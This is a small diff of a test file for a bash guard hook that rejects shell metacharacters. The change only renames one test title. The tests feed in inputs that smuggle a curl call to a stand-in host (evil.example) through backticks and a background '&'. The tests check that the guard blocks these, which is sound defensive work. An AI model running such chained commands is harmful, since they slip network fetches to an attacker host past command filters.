@@ -341,7 +341,7 @@ describe("bash-guard.hook — no-bypass (metacharacter rejection)", () => {
     expectDeny("ls `curl http://evil.example`");
   });
 
-  test("rejects a background `&` operator", () => {
+  test("rejects a background `&` control token", () => {
     expectDeny("ls & curl http://evil.example");
   });
 
